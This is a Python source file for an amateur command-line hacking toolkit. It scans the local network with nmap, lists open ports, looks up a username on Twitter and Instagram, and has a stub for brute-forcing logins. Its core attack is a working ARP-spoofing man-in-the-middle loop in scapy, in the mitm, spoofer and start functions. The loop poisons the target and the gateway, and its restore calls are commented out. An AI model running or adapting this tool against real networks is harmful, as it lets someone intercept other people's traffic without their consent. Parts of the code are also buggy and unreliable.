import nmap
import os
import socket as sc
from sys import platform
import sys
from bs4 import BeautifulSoup as bs
import requests as rq
import netifaces as ni
import argparse
import time
import scapy.all as scapy
from uuid import getnode as get_mac


if platform == "linux" or platform == "linux2":
    os.system("clear")
if platform == "win32":
    os.system("cls")

def colored(r, g, b, text):
    return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)

def help():
    print("\n")
    print("     ", colored(0, 255, 0, commands[0]), "makes you exit.")
    print("     ",colored(0, 255, 0, commands[3]), "clear the screen")
    print("     ",colored(0, 255, 0, commands[2]), "prompt the help menu")
    print("     ",colored(0, 255, 0, commands[8]), "show iformation obout your ip configuration depending on your os")
    print("     ",colored(0, 255, 0, commands[9]), "let's you configure your iface (wifi or ethernet, here called wlan or eth)")
    print("\n")
    print("     ",colored(0, 255, 0, commands[1]), "show the alive devices on your local network")
    print("     ",colored(0, 255, 0, commands[4]), "check open ports on the alive devices of your local network")
    print("     ",colored(0, 255, 0, commands[7]), "chack for all alive connexion on your local network")
    print("     ",colored(0, 255, 0, commands[5]), "attack a device with 'man in the middle' attack")
    print("     ",colored(0, 255, 0, commands[6]), "looks for a username in various websites")
    print("     ",colored(0, 255, 0, commands[10]), "crack a password using brutforce methode")


def conf():
    iface = str(input("what interface do you want to use? : "))

    if iface == "eth":
        try:
            ni.ifaddresses('eth0')
            local_ip = str(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])
        except ValueError:
            try:
                ni.ifaddresses('eth1')
                local_ip = str(ni.ifaddresses('eth1')[ni.AF_INET][0]['addr'])
            except ValueError:
                print("")
                print("     no ethernet connexion detedted")

    if iface == "wlan":
        try:
            ni.ifaddresses('wlan0')
            local_ip = str(ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr'])
        except KeyError:
            try:
                ni.ifaddresses('wlan1')
                local_ip = str(ni.ifaddresses('wlan1')[ni.AF_INET][0]['addr'])
            except ValueError:
                print("")
                print("     no wifi connexion detedted")
    try:
        print("you are now using", colored(0, 255, 0, local_ip))
    except UnboundLocalError:
        None

def scan():
    nm = nmap.PortScanner()
    myip = local_ip+"/24"
    scan = nm.scan(hosts= myip , arguments='-sn')
    for i in scan['scan']:
        brand = list(scan['scan'][i]['vendor'].values())
        name = scan['scan'][i]['hostnames'][0]['name']
        if len(brand) > 0:
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, brand[0]), "and called", colored(0, 255, 150, name), "is up")
        else:
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, "Unknown"), "and called", colored(0, 255, 150, name), "is up")

def scan_all():
    nm = nmap.PortScanner()
    myip = local_ip+"/24"
    scan_all = nm.scan(hosts= myip , arguments='-sn -Pn')
    for i in scan_all['scan']:
        brand = list(scan_all['scan'][i]['vendor'].values())
        name = scan_all['scan'][i]['hostnames'][0]['name']
        if len(brand) == 1 and name != str():
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, brand[0]), "and called", colored(0, 255, 150, name), "is up")
        elif len(brand) == 0 and name != str():
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, "Unknown"), "and called", colored(0, 255, 150, name), "is up")


def scan_firewall():
    nm = nmap.PortScanner()
    myip = local_ip+"/24"
    scan = nm.scan(hosts= myip , arguments='-sn -Pn')
    for i in scan['scan']:
        if scan['scan'][i]['hostnames'][0]['name'] != str():
            print("     ", colored(255, 0, 0, i))
            print("")
            S = nm.scan(i, '20-450')
            try:
                for p in S['scan'][i]['tcp']:
                    print("     port", colored(0, 255, 0, str(p)), "is open")
            except KeyError:
                print(colored(255, 0, 0, "  None. "))
            print("")

def mitm():
    print("")
    target_ip = str(input(colored(0, 255, 0, "     chose an IP address to attack : ")))
    target = target_ip + "/24"
    nm = nmap.PortScanner()
    scan = nm.scan(hosts= target , arguments='-sn -Pn')
    for i in scan['scan']:
        brand = list(scan['scan'][i]['vendor'].values())
        name = scan['scan'][i]['hostnames'][0]['name']
        if name == "lan.home":
            spoof_ip = i
    scan = nm.scan(hosts = target, arguments='-sn')
    for i in scan['scan']:
        if i == target_ip:
            destinationMac = scan['scan'][i]['addresses']['mac']
    for i in scan['scan']:
        if i == local_ip:
            print(local_ip)
    start(target_ip, spoof_ip, destinationMac)


def search():
    user = str(input("username :"))
    for i in url:
        code = rq.get(i + user).text
        soup = bs(code, 'lxml')
        title = soup.find_all('title')
        print(title)

def ip():
    print("")
    if platform == "linux" or platform == "linux2":
        os.system("ip addr")
    if platform == "win32":
        os.system("ipconfig")
    print("")
    print("you are currently known as", colored(0, 255, 0, local_ip))

def spoofer(targetIP, spoofIP, destinationMac):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(destinationIP, sourceIP, destinationMac):
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=destinationMac,psrc=sourceIP,hwsrc=sourceMAC)
    scapy.send(packet, count=4,verbose=False)

def start(targetIP, gatewayIP, destinationMac):
    packets = 0
    mitmattack = True
    try:
        while mitmattack:
            spoofer(targetIP,gatewayIP, destinationMac)
            spoofer(gatewayIP,targetIP, destinationMac)
            print("\r[+] Sent packets "+ str(packets))
            scapy.sniff(filter='arp and host %s or %s' %\
                        (gatewayIP, targetIP), count=1)
            sys.stdout.flush()
            packets +=2
            time.sleep(2)
    except KeyboardInterrupt:
        print(colored(0, 255, 0, "\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state.."))
        mitmattack = False
        #restore(targetIP,gatewayIP, destinationMac)
        #restore(gatewayIP,targetIP, destinationMac)

def psw_crack():
    url = str(input("Enter login page {} : ".format( colored(0, 255, 0, "URL"))))
    post = str(input("Enter the {} made : ".format( colored(0, 255, 0, "request"))))
    error_msg = str(input("Enter {} : ".format(colored(255, 0, 0, "Error message"))))
    #psw = pd.read_csv(rockyou.txt, encoding= 'unicode_escape')

    #with open("rockyou.txt", encoding = 'UTF-8') as psw:
        #P = psw.readlines()
        #print(P)
        #psw.close()



def main():
    run = True
    while run:
        verif = False
        cmd = str(input(colored(255, 0, 0, "        -$  ")))

        for i in commands:
            if cmd == i:
                verif = True
        if verif == True:
            if cmd == "exit":
                if platform == "linux" or platform == "linux2":
                    os.system("clear")
                if platform == "win32":
                    os.system("cls")
                print(colored(0, 255, 0, "Goodbye."))
                run = False
            if cmd == "clear":
                if platform == "linux" or platform == "linux2":
                    os.system("clear")
                if platform == "win32":
                    os.system("cls")
            if cmd == "help":
                help()
            if cmd == "ip":
                ip()
            if cmd == "config":
                conf()

            if cmd == "scan":
                scan()
            if  cmd == "scan firewall":
                scan_firewall()
            if cmd == "scan all":
                scan_all()
            if cmd == "mitm":
                mitm()
            if cmd == "search":
                search()
            if cmd == "password crack":
                psw_crack()
        else:
            print("\n")
            print(colored(255, 0, 0, "      '{}'".format(cmd)), colored(50, 50, 150, " is not a command, use help to see all the commands."))
        print("\n")

print("\n")
print("@%(,.                   .,#                                        ")
print("                *@@@@@@@@@*@                                       ")
print("        @@@,                @*             &                       ")
print(" @@                          @@@@@@@@@@@,      *                   ")
print("                          (@@@&         .@@@@@*@   %               ")
print("                        (@@#                   @@@@@ ,             ")
print("                       %@@                          @@@@           ")
print("                       @@                            #@@@          ")
print("                        @@@                                        ")
print("                         @@@@.                                     ")
print("                            *@@@@@@@@@@@@@@@@#                     ")
print("                                             &@@@@@@@@@            ")
print("                                                   @@    %@@       ")
print("                                                      #@     .@    ")
print("                                                         @      @  ")
print("                                                           %      .")
print("                                                            @      ")
print("                                                             #     ")

print("\n")

print(colored(255, 0, 0, "      Hello"), colored(0, 255, 0, "{}".format(sc.gethostname())), colored(255, 0, 0, "I am nobody."))
print("\n")

try:
    ni.ifaddresses('eth0')
    local_ip = str(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])
except ValueError:
    try:
        ni.ifaddresses('wlan0')
        local_ip = str(ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr'])
    except ValueError:
        try:
            ni.ifaddresses('wlan1')
            local_ip = str(ni.ifaddresses('wlan1')[ni.AF_INET][0]['addr'])
        except ValueError:
            local_ip = sc.gethostbyname(sc.gethostname())

url = ["https://www.twitter.com/", "https://www.instagram.com/"]

commands = ["exit", "scan", "help", "clear", "scan firewall", "mitm", "search", "scan all", "ip", "config", "password crack"]

sourceMAC  = str(get_mac())

main()
